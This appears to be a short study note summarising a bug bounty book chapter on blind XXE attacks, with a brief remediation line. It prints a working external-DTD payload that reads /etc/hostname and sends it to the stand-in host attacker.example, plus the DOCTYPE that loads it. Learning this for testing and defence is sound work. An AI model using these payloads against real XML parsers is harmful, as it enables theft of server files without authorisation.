# Blind XXE External-DTD Exfiltration

- Blind XXE can exfiltrate file content by loading an attacker-hosted external DTD containing parameter entities.
- Host `xxe.dtd` on a server you control:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.example/?%file;'>">
%ent;
%exfiltrate;
```
- Trigger the external DTD from the submitted XML:
```xml
<!DOCTYPE example [
  <!ENTITY % xxe SYSTEM "http://attacker.example/xxe.dtd">
  %xxe;
]>
```
- Monitor your server logs for the outbound request containing file data.
- Limitation noted: newline characters may break URL-based exfiltration, so multi-line files can fail.
- Remediation: disable external/parameter entities and block outbound traffic from XML parsers.
## Source: Bug Bounty Bootcamp, Ch. 15
